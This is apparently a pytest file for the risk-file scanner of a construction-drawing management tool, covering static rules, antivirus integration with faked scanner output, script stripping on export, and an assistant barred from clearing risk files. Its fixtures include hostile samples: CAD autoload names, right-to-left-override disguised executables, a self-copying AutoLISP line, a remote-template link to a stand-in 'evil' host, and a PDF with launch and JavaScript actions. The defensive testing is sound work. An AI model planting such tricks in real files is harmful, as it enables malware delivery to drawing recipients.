"""风险文件检查：静态规则、收图登记、问题与决定、导出去脚本、杀毒软件对接（用假的扫描输出，不调用真杀毒软件）。"""

import io
import zipfile
from pathlib import Path

import pymupdf
import pytest

from bidbench import antivirus, export, ingest, reports, risk, state
from bidbench.assistant import Toolkit, ToolError
from bidbench.store import Project, add_decision

MZ = b"MZ" + b"\0" * 62


def kinds(findings):
    return {(f.level, f.kind) for f in findings}


@pytest.mark.parametrize("name,head,expected", [
    ("acad.lsp", b"(princ)", {("high", "cad_autoload")}),
    ("ACADDOC.FAS", b"\r\n FAS4-FILE ; Do not change it!", {("high", "cad_autoload")}),
    ("acad2016doc.lsp", b"", {("high", "cad_autoload")}),
    ("zwcaddoc.lsp", b"", {("high", "cad_autoload")}),
    ("menu.mnl", b"", {("high", "cad_autoload")}),
    ("标注工具.vlx", b"VRTLIB-1", {("medium", "cad_script")}),
    ("批量打印.scr", b"_.plot\n", {("medium", "cad_script")}),
    ("屏保.scr", MZ, {("high", "executable")}),
    ("图纸目录.pdf.exe", MZ, {("high", "double_ext")}),
    ("setup.exe", MZ, {("high", "executable")}),
    ("说明\u202egpj.exe", MZ, {("high", "bidi_name"), ("high", "executable")}),  # 显示成“说明exe.jpg”
    ("建施-01.pdf", MZ, {("high", "disguised")}),
    ("logo.gif", b"\r\n FAS4-FILE", {("high", "disguised")}),
    ("报价.xlsm", b"PK\x03\x04", {("medium", "macro_format")}),
    ("建施-01.pdf", b"%PDF-1.7", set()),
    ("一层平面.dwg", b"AC1032", set()),
    ("PRJ1-AR-0005\u200e-02 一层平面.dwg", b"AC1032", {("low", "bidi_name_benign")}),  # 外方系统导出的名字夹了方向字符
    ("建施-01\u202b.pdf", b"%PDF-1.7", {("low", "bidi_name_benign")}),
    ("一层平面\u202egwd.exe", MZ, {("high", "bidi_name"), ("high", "executable")}),  # 显示成“一层平面exe.dwg”
    ("一层平面\u200e.dwg", MZ, {("high", "bidi_name"), ("high", "disguised")}),  # 名字是 .dwg，内容是程序
    ("图纸\u202e.dwg", b"%PDF", {("high", "bidi_name")}),  # 内容和扩展名对不上
    ("lisp教程.txt", b"(defun c:x ()", set()),
])
def test_check_name(name, head, expected):
    assert kinds(risk.check_name(name, head)) == expected


def _zip(entries):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for k, v in entries.items():
            z.writestr(k, v)
    return buf.getvalue()


def test_check_content(tmp_path):
    def f(name, data):
        p = tmp_path / name
        p.write_bytes(data)
        return p

    lsp = f("a.lsp", b'(vl-file-copy "acad.lsp" (strcat (getvar "dwgprefix") "acad.lsp"))')
    assert kinds(risk.check_content(lsp, ".lsp", "other")) == {("high", "lisp_suspicious")}
    assert risk.check_content(f("b.lsp", b"(defun c:zz () (command \"zoom\" \"e\"))"), ".lsp", "other") == []
    xlsm = f("c.xlsm", _zip({"xl/workbook.xml": "<w/>", "xl/vbaProject.bin": "x"}))
    assert kinds(risk.check_content(xlsm, ".xlsm", "office")) == {("high", "macro")}
    rels = '<Relationship Type="http://schemas/attachedTemplate" Target="http://evil/t.dotm" TargetMode="External"/>'
    docx = f("d.docx", _zip({"word/document.xml": "<d/>", "word/_rels/settings.xml.rels": rels}))
    assert kinds(risk.check_content(docx, ".docx", "office")) == {("high", "remote_template")}
    assert risk.check_content(f("e.docx", _zip({"word/document.xml": "<d/>"})), ".docx", "office") == []
    ole = f("f.xls", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 100 + "_VBA_PROJECT".encode("utf-16-le"))
    assert kinds(risk.check_content(ole, ".xls", "office")) == {("high", "macro")}

    doc = pymupdf.open()
    doc.new_page().insert_text((50, 50), "plain")
    plain = doc.tobytes()
    assert risk.pdf_findings(plain) == []
    page = doc[0]
    page.insert_link({"kind": pymupdf.LINK_LAUNCH, "from": pymupdf.Rect(0, 0, 40, 40), "file": "calc.exe"})
    doc.xref_set_key(doc.pdf_catalog(), "OpenAction", "<</S/JavaScript/JS(app.alert\\(1\\))>>")
    pdf = f("g.pdf", doc.tobytes(garbage=1, use_objstms=1))  # 放进压缩对象流里也要查得到
    assert kinds(risk.check_content(pdf, ".pdf", "pdf")) == {("high", "pdf_script"), ("high", "pdf_launch")}


def test_receive_registers_risks(demo):
    sec = state.build(demo, with_diff=False)["security"]
    names = {f["name"]: f for f in sec["files"]}
    assert set(names) == {"acad.lsp", "查看说明.pdf.exe", "工程量清单.xlsm", "结施-04 三层梁配筋图(修).pdf"}
    assert all(f["level"] == "high" for f in names.values()) and sec["pending"] == 4
    assert any("复制文件" in x for x in names["acad.lsp"]["findings"])
    assert demo.receive_results[2].risky and not demo.receive_results[0].risky
    with demo.connect() as con:  # 带宏的 xlsm 当文件登记，不当压缩包拆开
        assert not con.execute("SELECT 1 FROM occurrences WHERE path LIKE '%vbaProject.bin'").fetchone()
    st = state.build(demo, as_of=2, with_diff=False)
    assert st["security"]["files"] == [] and not any(i["kind"] == "风险文件" for i in st["issues"])


def test_risk_issues_and_decisions(demo_copy):
    st = state.build(demo_copy)
    risky = {i["title"]: i for i in st["issues"] if i["kind"] == "风险文件"}
    lsp = risky["acad.lsp（高风险）"]
    assert lsp["level"] == "crit" and [o["value"] for o in lsp["options"]] == ["safe", "dangerous"]
    exe = risky["查看说明.pdf.exe（高风险）"]
    add_decision(demo_copy, "risk", lsp["options"][0]["key"], "safe")
    add_decision(demo_copy, "risk", exe["options"][1]["key"], "dangerous")
    st = state.build(demo_copy)
    titles = {i["title"]: i for i in st["issues"] if i["kind"] == "风险文件"}
    assert "acad.lsp（高风险）" not in titles and titles["查看说明.pdf.exe（高风险）"]["confirmed"]
    assert st["security"]["pending"] == 2
    assert "查看说明.pdf.exe" in reports.qa_report(st)
    rep = reports.security_report(st)
    assert "已确认安全" in rep and "已确认有风险" in rep and "SECURELOAD" in rep


def test_export_strips_scripts(demo_copy):
    st = state.build(demo_copy, with_diff=False)
    out = export.export_current(demo_copy, st)
    jg04 = next(out.rglob("结施-04*.pdf"))
    assert risk.pdf_findings(jg04.read_bytes()) == []
    assert "350×700" in pymupdf.open(jg04)[0].get_text()  # 图面内容还在
    assert "已去除" in (out / "现行图纸清单.md").read_text(encoding="utf-8")
    pid = next(s["current_page"] for s in st["sheets"] if s["no"] == "结施-04")
    assert risk.pdf_findings(export.page_pdf_bytes(demo_copy, pid)) == []


def test_assistant_cannot_propose_on_risk(demo_copy):
    kit = Toolkit(demo_copy, source="测试")
    rows = kit.list_issues(kind="风险文件")["issues"]
    assert rows and all(r["options"] == [] for r in rows)
    with pytest.raises(ToolError, match="用户自己判断"):
        kit.propose_issue_resolution(rows[0]["id"], "1", "看起来是插件")
    assert kit.project_overview()["risk_files_pending"] == 4


def test_rescan_static_is_idempotent(demo_copy):
    with demo_copy.connect() as con:
        before = sorted(tuple(r) for r in con.execute("SELECT batch_seq, sha256, kind FROM risk_findings"))
        con.execute("DELETE FROM risk_findings")  # 模拟功能上线前收的老项目
    assert risk.rescan_static(demo_copy) == 4
    with demo_copy.connect() as con:
        after = sorted(tuple(r) for r in con.execute("SELECT batch_seq, sha256, kind FROM risk_findings"))
    assert after == before


DEFENDER_OUT = """Scan starting...
Scan finished.
Scanning C:\\proj\\.scan-1\\ found 1 threats.

<===========================LIST OF DETECTED THREATS==========================>
----------------------------- Threat information ------------------------------
Threat                  : Virus:DOS/EICAR_Test_File
Resources               : 2 total
    file                : C:\\proj\\.scan-1\\{sha}.lsp
    file                : C:\\proj\\.scan-1\\{sha}.lsp->(inner)
-------------------------------------------------------------------------------
"""


def test_parse_engine_output():
    sha = "a" * 64
    d = antivirus.Engine("Windows Defender", "defender", "MpCmdRun.exe")
    assert antivirus.parse_output(d, DEFENDER_OUT.replace("{sha}", sha)) == {sha: ["Virus:DOS/EICAR_Test_File"] * 2}
    c = antivirus.Engine("ClamAV", "clamav", "clamscan")
    assert antivirus.parse_output(c, f"/p/.scan-1/{sha}.pdf: Win.Test.EICAR_HDB-1 FOUND\n") == {sha: ["Win.Test.EICAR_HDB-1"]}


def test_scan_project_with_fake_engine(demo_copy, monkeypatch):
    with demo_copy.connect() as con:
        lsp = con.execute("SELECT sha256 FROM occurrences WHERE path LIKE '%acad.lsp'").fetchone()[0]
        xlsm = con.execute("SELECT f.sha256, f.stored_path FROM files f JOIN occurrences o ON o.sha256=f.sha256"
                           " WHERE o.path LIKE '%.xlsm'").fetchone()
        n3 = con.execute("SELECT COUNT(DISTINCT o.sha256) FROM occurrences o JOIN files f ON f.sha256=o.sha256"
                         " WHERE o.batch_seq=3 AND f.kind!='archive' AND NOT EXISTS (SELECT 1 FROM occurrences p"
                         " WHERE p.sha256=o.sha256 AND p.batch_seq<3)").fetchone()[0]
    (demo_copy.root / xlsm["stored_path"]).unlink()  # 模拟被实时防护隔离
    calls = []

    def fake_run(cmd):
        calls.append(cmd)
        assert len(list(Path(cmd[cmd.index("-File") + 1]).iterdir())) == n3 - 1  # 被隔离的那个不在里面
        return 2, DEFENDER_OUT.replace("{sha}", lsp)

    monkeypatch.setattr(antivirus, "_run", fake_run)
    eng = antivirus.Engine("Windows Defender", "defender", "MpCmdRun.exe")
    res = antivirus.scan_project(demo_copy, 3, eng)
    assert res.ok and list(res.threats) == [lsp] and res.vanished == [xlsm["sha256"]]
    assert "-DisableRemediation" in calls[0] and not list(demo_copy.root.glob(".scan-*"))  # 暂存目录已清理
    sec = state.build(demo_copy, with_diff=False)["security"]
    by = {f["sha"]: f for f in sec["files"]}
    assert "Windows Defender" in by[lsp]["sources"] and any("EICAR" in x for x in by[lsp]["findings"])
    assert any("隔离" in x for x in by[xlsm["sha256"]]["findings"])
    assert sec["scans"][-1]["threats"] == 2 and "未发现病毒" not in reports.security_report(state.build(demo_copy))

    monkeypatch.setattr(antivirus, "_run", lambda cmd: (-2147023790, "CmdTool: Failed with hr = 0x800106BA."))
    res = antivirus.scan_project(demo_copy, 4, eng)
    assert not res.ok and "关闭" in res.message


def test_unreadable_file_is_reported(tmp_path, monkeypatch):
    src = tmp_path / "in.zip"
    src.write_bytes(_zip({"图纸/建施-01.pdf": b"%PDF-1.4 x", "图纸/病毒.exe": MZ}))
    real = ingest.sha256_file

    def blocked(p):
        if Path(p).name == "病毒.exe":
            raise PermissionError(13, "拒绝访问")
        return real(p)

    monkeypatch.setattr(ingest, "sha256_file", blocked)
    proj = Project.init(tmp_path / "p", "拦截")
    r = ingest.receive(proj, src, "2026-10-12")
    assert [i["kind"] for i in r.issues if i["path"].endswith("病毒.exe")] == ["blocked"]
    assert r.by_kind.get("pdf") == 1  # 其他文件照常收


def test_clamav_without_database(demo_copy, monkeypatch):
    out = ("LibClamAV Error: cli_loaddbdir: No supported database files found in /var/lib/clamav\n"
           "ERROR: Can't open file or directory\n")
    monkeypatch.setattr(antivirus, "_run", lambda cmd: (2, out))
    res = antivirus.scan_project(demo_copy, 4, antivirus.Engine("ClamAV", "clamav", "clamscan"))
    assert not res.ok and "freshclam" in res.message
